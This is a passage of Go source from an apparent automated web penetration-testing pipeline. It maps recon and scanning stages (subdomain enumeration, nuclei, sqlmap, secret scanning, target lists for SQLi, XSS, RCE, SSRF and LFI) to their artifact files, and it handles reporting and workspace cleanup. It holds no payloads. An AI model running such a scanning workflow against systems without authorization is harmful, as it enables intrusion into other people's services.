			if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
				return err
			}
			file, err := os.OpenFile(full, os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				return err
			}
			file.Close()
		} else {
			return err
		}
	}
	return nil
}

func stageArtifacts(step Step) (inputs, outputs []string) {
	inputs = coverage.ExtractInputPaths(step.Command)
	outputs = coverage.ExtractOutputPaths(step.Command)
	knownInputs := map[string][]string{
		"scope_guard":          {"subs.txt"},
		"jsmap_scrape":         {"alive.txt"},
		"merge_all_urls":       {"gau_urls.txt", "wayback_urls.txt", "clean_katana_urls.txt", "openapi_paths.txt"},
		"url_filter_alive":     {"all_urls_scannable.txt"},
		"merge_js_endpoints":   {"all_urls.txt", "js_endpoints.txt"},
		"scope_filter":         {"all_urls.txt", "all_urls_200.txt", "js_endpoints.txt"},
		"nuclei_target_merge":  {"alive.txt", "all_urls_200.txt", "js_endpoints.txt"},
		"filter_testable_sqli": {"all_urls_200.txt"},
		"xss_targets":          {"all_urls_200.txt"},
		"rce_targets":          {"all_urls_200.txt"},
		"idor_targets":         {"all_urls_200.txt"},
		"ssrf_targets":         {"all_urls_200.txt"},
		"redirect_targets":     {"all_urls_200.txt"},
		"lfi_targets":          {"all_urls_200.txt"},
	}
	known := map[string][]string{
		"scope_guard":         {"scope.json", "in_scope_hosts.txt", "out_of_scope_hosts.txt", "scoped_subs.txt"},
		"subfinder":           {"subfinder.txt"},
		"assetfinder":         {"assetfinder.txt"},
			"crtsh":               {"crtsh.txt"},
		"amass_enum":          {"amass_raw.txt"},
		"dnsx_resolve":        {"live_subs.txt"},
		"httpx_probe":         {"alive.txt"},
		"jsmap_scrape":        {"js_assets.txt", "js_endpoints.txt", "jsmap_status.txt"},
		"merge_all_urls":      {"all_urls.txt"},
		"url_filter_alive":    {"all_urls_200.txt"},
		"merge_js_endpoints":  {"all_urls.txt", "js_endpoints_full.txt"},
		"scope_filter":        {"all_urls.txt", "all_urls_200.txt", "js_endpoints.txt", "scope_filter_status.txt"},
		"nuclei_target_merge": {"nuclei_targets.txt"},
		"sqlmap_scan":         {"sqlmap_targets.txt", "sqlmap_status.json"},
		"trufflehog_scan":     {"trufflehog_status.json", "trufflehog_results.txt"},
		"nuclei_exposures":    {"credentials_found.txt"},
		"nuclei_misconfigs":   {"misconfigs.txt"},
		"nuclei_auth_scan":    {"auth_results.txt"},
		"nuclei_graphql_scan": {"graphql_exposed.txt"},
		"cors_check":          {"cors_findings.txt"},
		"dirbrute_verify_200": {"ffuf_dirs_200.txt"},
		"js_endpoints_scan":   {"js_endpoint_findings.txt"},
		"ghauri_sqli":         {"ghauri_results.txt"},
		"hidden_params_arjun": {"hidden_params.txt"},
	}
	inputs = append(inputs, knownInputs[step.ID]...)
	outputs = append(outputs, known[step.ID]...)
	return uniquePaths(inputs), uniquePaths(outputs)
}

func uniquePaths(paths []string) []string {
	seen := make(map[string]bool)
	out := make([]string, 0, len(paths))
	for _, path := range paths {
		if path == "" || seen[path] {
			continue
		}
		seen[path] = true
		out = append(out, path)
	}
	return out
}

func writeBlockedRecords(workDir string, steps []Step) error {
	records, err := coverage.LoadStageRecords(workDir)
	if err != nil {
		return err
	}
	seen := make(map[string]bool, len(records))
	for _, record := range records {
		seen[record.StageID] = true
	}
	for _, step := range steps {
		if !seen[step.ID] {
			now := time.Now()
			if err := coverage.WriteStageRecord(workDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusBlocked, StartedAt: now, FinishedAt: now, SkipReason: "not_started_due_to_previous_stage_failure"}); err != nil {
				return err
			}
		}
	}
	return nil
}

func finalizeRun(domain string, paths *config.Paths, cp *checkpoint.Checkpoint, steps []Step, startedAt time.Time, runErr error) error {
	if err := writeBlockedRecords(paths.WorkDir, steps); err != nil && runErr == nil {
		runErr = err
	}
	stageRecords, err := coverage.LoadStageRecords(paths.WorkDir)
	var report coverage.CoverageReport
	if err != nil && runErr == nil {
		runErr = err
	}
	if err == nil {
		report = coverage.Evaluate(domain, startedAt, time.Now(), stageRecords)
		if writeErr := coverage.WriteReport(paths.WorkDir, report); writeErr != nil && runErr == nil {
			runErr = writeErr
		}
		if report.Status != "COMPLETE" && runErr == nil {
			runErr = fmt.Errorf("coverage incomplete: %s", strings.Join(report.RequiredIssues, "; "))
		}
	}
	evidenceRecords, evidenceErr := evidence.BuildIndex(paths.WorkDir)
	if err != nil && runErr == nil {
		runErr = err
	} else if evidenceErr != nil {
		runErr = evidenceErr
	} else if evidenceErr == nil {
		if writeErr := evidence.WriteIndex(paths.WorkDir, evidenceRecords); writeErr != nil && runErr == nil {
			runErr = writeErr
		}
		if err == nil {
			if writeErr := owasp.Generate(paths.WorkDir, domain, report, stageRecords, evidenceRecords); writeErr != nil && runErr == nil {
				runErr = writeErr
			}
		}
	}
	if summaryErr := summary.Generate(paths.WorkDir, cp); summaryErr != nil {
		return summaryErr
	}
	return runErr
}

// CleanWorkspace removes temporary, redundant, and empty artifact directories from the work directory.
func CleanWorkspace(paths *config.Paths) error {
	workDir := paths.WorkDir
	
	// 1. Delete Trash (*.tmp, *.log, *.status)
	files, err := os.ReadDir(workDir)
	if err != nil {
		return err
	}
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		name := f.Name()
		if strings.HasSuffix(name, ".tmp") || strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".status") {
			if err := os.Remove(filepath.Join(workDir, name)); err != nil {
				return err
			}
		}
	}

	// 2. Delete Metadata
	if err := os.Remove(filepath.Join(workDir, "trufflehog_version.txt")); err != nil && !os.IsNotExist(err) {
		return err
	}

	// 3. Remove Redundancy
	// (e.g., delete all_urls.txt if all_urls_200_scannable.txt exists)
	redundancies := map[string]string{
		"all_urls.txt": "all_urls_200_scannable.txt",
	}
	for raw, processed := range redundancies {
		if _, err := os.Stat(filepath.Join(workDir, processed)); err == nil {
			_ = os.Remove(filepath.Join(workDir, raw))
		}
	}

	// 4. Clean Empty Folders
	folders := []string{"api_specs", "sqlmap_results"}
	for _, folder := range folders {
		fullPath := filepath.Join(workDir, folder)
		entries, err := os.ReadDir(fullPath)
		if err == nil && len(entries) == 0 {
			_ = os.Remove(fullPath)
		}
	}

	return nil
}
